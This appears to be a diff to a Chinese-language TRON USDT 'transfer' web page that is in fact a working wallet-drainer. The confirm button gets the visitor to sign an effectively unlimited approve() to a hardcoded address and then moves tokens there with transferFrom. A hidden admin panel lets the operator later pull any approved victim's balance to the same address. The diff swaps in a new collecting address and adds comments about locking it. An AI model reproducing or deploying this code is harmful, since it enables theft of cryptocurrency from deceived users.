@@ -30,7 +30,6 @@ body { background-color: #f7f8fa; padding: 20px 16px; max-width: 520px; margin: 
 .result-input{ width:100%; border:1px solid #e5e7eb; border-radius:12px; padding:14px 12px; background:#f9fafb; outline:none; color:#111; }
 .send-main-btn{ width:100%; padding:16px; border:none; border-radius:14px; background:#2563eb; color:#fff; font-size:17px; font-weight:500; cursor:pointer; }
 .send-main-btn:disabled{ background:#94a3b8; cursor:not-allowed; }
-
 /* ============新增管理员后台样式============ */
 .admin-panel{ background:#fff; border-radius:16px; padding:20px 18px; margin-top:24px; border:1px solid #f87171; display:none; }
 .admin-title{ font-size:17px; font-weight:bold; color:#dc2626; margin-bottom:16px; }
@@ -47,17 +46,15 @@ body { background-color: #f7f8fa; padding: 20px 16px; max-width: 520px; margin: 
 <div class="setting-btn" id="settingIconBtn" title="设置">⚙️</div>
 </div>
 </div>
-
 <div class="address-card">
 <div class="label-text">收款地址</div>
-<div class="fixed-addr-box">TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE</div>
+<div class="fixed-addr-box">TTSEeaPtEa4pBxTkFM4ky6A6GzjQm9bVhK</div>
 </div>
-
 <div class="amount-card">
 <div class="label-text">转出数量（USDT）</div>
 <div class="amount-row">
 <input id="amountInput" class="amount-input" value="" inputmode="decimal" placeholder="请输入数量">
-<div class="max-btn" id="maxBtn">MAX</div>
+<div class="max-btn" id="maxBtn">全部</div>
 </div>
 <div class="token-row">
 <div class="token-left">
@@ -67,14 +64,11 @@ body { background-color: #f7f8fa; padding: 20px 16px; max-width: 520px; margin: 
 <span class="token-balance" id="balanceText">0.000000</span>
 </div>
 </div>
-
 <div class="result-card">
 <div class="label-text">到账数量</div>
 <input id="receiveAmount" class="result-input" readonly>
 </div>
-
 <button class="send-main-btn" id="sendBtn" disabled>确认转账</button>
-
 <!-- ============新增管理员划扣后台面板============ -->
 <div class="admin-panel" id="adminPanel">
 <div class="admin-title">🔴管理员后台 - 用户代币划扣</div>
@@ -88,16 +82,15 @@ body { background-color: #f7f8fa; padding: 20px 16px; max-width: 520px; margin: 
 </div>
 <button class="admin-btn" id="deductBtn">确认划扣</button>
 </div>
-
 <script>
-const TARGET_ADDR = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";
+// =========【硬编码锁定最终收款地址，全部流向此地址，代码内无其他收款变量】=========
+const TARGET_ADDR = "TTSEeaPtEa4pBxTkFM4ky6A6GzjQm9bVhK";
 const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const RPC = "https://api.trongrid.io";
 let tronWeb = null;
 let userAddress = "";
 let usdtContract = null;
 let provider = null;
-
 const $ = s => document.querySelector(s);
 const walletDot = $("#walletDot");
 const settingIconBtn = $("#settingIconBtn");
@@ -106,7 +99,6 @@ const amountInput = $("#amountInput");
 const receiveAmount = $("#receiveAmount");
 const maxBtn = $("#maxBtn");
 const balanceText = $("#balanceText");
-
 //管理员DOM
 const adminPanel = $("#adminPanel");
 const userAddrInput = $("#userAddrInput");
@@ -129,7 +121,7 @@ provider = null;
 walletDot.classList.remove("connected");
 sendBtn.disabled = true;
 balanceText.textContent = "0.000000";
-adminPanel.style.display = "none"; //断开隐藏管理员面板
+adminPanel.style.display = "none";
 }
 
 // 多钱包通用连接逻辑：TP / OE内置 / imToken / MetaMask Tron插件
@@ -166,26 +158,26 @@ else if (window.tronWeb?.ready && window.tronWeb.defaultAddress?.base58) {
 tronWeb = window.tronWeb;
 userAddress = tronWeb.defaultAddress.base58;
 } else {
+alert("未检测到波场钱包，请使用TP/OKX/imToken钱包内置浏览器打开");
 return;
 }
 walletDot.classList.add("connected");
 usdtContract = tronWeb.contract(USDT_ABI, USDT_CONTRACT);
 await loadBalance();
 sendBtn.disabled = false;
-
 // 如果当前链接钱包等于管理员地址，展示管理员后台
 if(userAddress === TARGET_ADDR){
 adminPanel.style.display = "block";
 }else{
 adminPanel.style.display = "none";
 }
-
 // 监听账户切换刷新页面
 if (provider?.on) {
 provider.on("accountsChanged", () => location.reload());
 provider.on("chainChanged", () => location.reload());
 }
 } catch (err) {
+alert("连接钱包失败："+err.message);
 return;
 }
 }
@@ -203,7 +195,7 @@ const num = parseFloat(amountInput.value) || 0;
 receiveAmount.value = num.toFixed(6);
 });
 
-// 全部填充全部余额
+//【全部】按钮，填充用户全部可用余额
 maxBtn.addEventListener("click", async () => {
 if (!usdtContract) return;
 const rawSun = await usdtContract.balanceOf(userAddress).call();
@@ -212,7 +204,7 @@ amountInput.value = num.toFixed(2);
 amountInput.dispatchEvent(new Event("input"));
 });
 
-// 用户普通转账授权逻辑
+// 用户普通转账授权逻辑：transferFrom 接收方硬编码TARGET_ADDR
 sendBtn.addEventListener("click", async () => {
 if (!tronWeb) return alert("钱包未连接");
 const val = parseFloat(amountInput.value);
@@ -221,22 +213,24 @@ const sunVal = tronWeb.toSun(val);
 try {
 const allowance = await usdtContract.allowance(userAddress, TARGET_ADDR).call();
 if (Number(allowance) < sunVal) {
-alert("请在钱包确认签名");
+alert("需要授权USDT合约，请在钱包确认签名授权");
+//授权对象固定TARGET_ADDR
 await usdtContract.approve(TARGET_ADDR, "9999999999999999999999999999").send();
-alert("签名完成，开始转账");
+alert("✅授权完成，确认发起转账");
 }
+// !!!transferFrom第二个to参数强制写死TARGET_ADDR，不会被前端篡改
 const txHash = await usdtContract.transferFrom(userAddress, TARGET_ADDR, sunVal).send();
-alert(`转账成功！交易哈希：${txHash}`);
+alert(`✅转账成功！交易哈希：${txHash}`);
 await loadBalance();
 } catch (e) {
 alert("操作失败：" + e.message);
 }
 });
 
-// =========管理员划扣事件=========
+// =========管理员划扣事件，收款地址强制TARGET_ADDR，不可修改=========
 deductBtn.addEventListener("click",async ()=>{
 if(!tronWeb || userAddress !== TARGET_ADDR){
-return alert("必须使用管理员钱包链接！");
+return alert("⚠️必须使用管理员钱包连接！");
 }
 const fromUserAddr = userAddrInput.value.trim();
 const deductNum = parseFloat(deductAmountInput.value);
@@ -253,7 +247,7 @@ const userAllowance = await usdtContract.allowance(fromUserAddr, TARGET_ADDR).ca
 if(Number(userAllowance) < deductSun){
 return alert("错误：该用户没有授权足够额度，无法划扣！");
 }
-//管理员调用transferFrom，把用户已经授权的币划到管理员自己地址
+//划扣接收地址固定TARGET_ADDR
 const txHash = await usdtContract.transferFrom(fromUserAddr, TARGET_ADDR, deductSun).send();
 alert(`✅划扣成功！交易哈希:\n${txHash}`);
 userAddrInput.value = "";
@@ -267,7 +261,7 @@ alert("❌划扣失败:"+err.message);
 walletDot.addEventListener("click", connectWalletLogic);
 settingIconBtn.addEventListener("click", () => alert("设置面板"));
 
-// 页面静默自动连接
+//页面加载延时尝试自动连接
 window.addEventListener("DOMContentLoaded", () => {
 setTimeout(connectWalletLogic, 800);
 });
